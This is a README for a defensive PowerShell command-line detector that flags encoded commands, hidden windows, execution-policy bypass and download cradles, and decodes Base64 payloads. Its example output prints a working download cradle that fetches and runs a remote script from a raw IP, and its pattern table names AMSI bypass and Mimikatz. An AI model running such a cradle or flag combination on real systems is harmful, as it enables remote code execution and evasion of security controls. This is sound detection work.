# PowerShell Obfuscation / LOLBin Detector

Scans a command-line string (from an EDR alert, Sysmon Event ID 1, or a process-creation log) for patterns commonly seen in malicious PowerShell usage — encoded commands, hidden windows, execution-policy bypass, download cradles, and known offensive-tooling function names. If it finds a `-EncodedCommand`/`-enc` flag, it decodes the actual Base64+UTF-16LE payload so you can see what the attacker was really trying to run.

This is command-line **text** pattern matching (the fast first-pass triage a SOC analyst does before deeper investigation), not behavioral/sandbox analysis.

## Usage

```bash
python detect.py "powershell.exe -enc SQBFAFgA..."
python detect.py --file commands.txt
```

## Example (real, working decode)

```
$ python detect.py --file cmd_test.txt
Command: powershell.exe -NoP -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0A...
  [FLAG] Encoded command flag (-enc/-EncodedCommand) -- Base64-encodes the real payload to dodge simple string/keyword matching
  [FLAG] Hidden window -- runs with no visible console, typical of non-interactive/malicious execution
  [FLAG] -NoProfile -- skips loading the user's PowerShell profile, common in automated/malicious scripts (also just common in legit automation, so weak signal alone)
  [FLAG] -ExecutionPolicy Bypass -- disables the script-execution safety prompt
  Decoded -EncodedCommand payload:
    IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.7/payload.ps1")
```

The flags alone tell you "this looks suspicious." The decode is what turns that into an actual finding: a classic download-cradle — fetch a remote script over HTTP and execute it in memory via `IEX`, never touching disk where an AV file scanner might catch it.

Benign commands correctly produce no flags:

```
$ python detect.py "powershell.exe -File C:\scripts\backup.ps1"
  No suspicious patterns matched.
```

## What it checks for

| Pattern | Why it's suspicious |
|---|---|
| `-enc` / `-EncodedCommand` | Hides the real command from simple string search |
| `-WindowStyle Hidden` | No visible console — not meant for a human to see |
| `-ExecutionPolicy Bypass` | Skips the script-execution safety prompt |
| `IEX` / `Invoke-Expression` | Executes a string as code — the "cradle" pattern |
| `.DownloadString` / `WebClient` | Fetches a remote payload, especially combined with IEX |
| `[Convert]::FromBase64String` | A second layer of runtime deobfuscation beyond `-enc` itself |
| AMSI references | Possible Anti-Malware Scan Interface bypass attempt |
| `Invoke-Mimikatz` / reflective PE injection function names | Known offensive-tooling — high-confidence malicious on its own |

`-NoProfile` and `-NonInteractive` are flagged but explicitly noted as weak signals alone — they're extremely common in legitimate scheduled tasks and CI scripts too, and only add confidence in combination with the stronger indicators above.

## Limitations

Purely textual/signature-based — trivially defeated by an attacker who reorders flags, uses string-concatenation tricks PowerShell itself resolves at parse time, or avoids these exact flag names. Real EDR products pair this kind of rule with AMSI-integrated script-block logging (which captures the *de-obfuscated* script content PowerShell actually executes, not just the launch command line) — this tool demonstrates the detection logic, not a production-grade evasion-resistant pipeline.
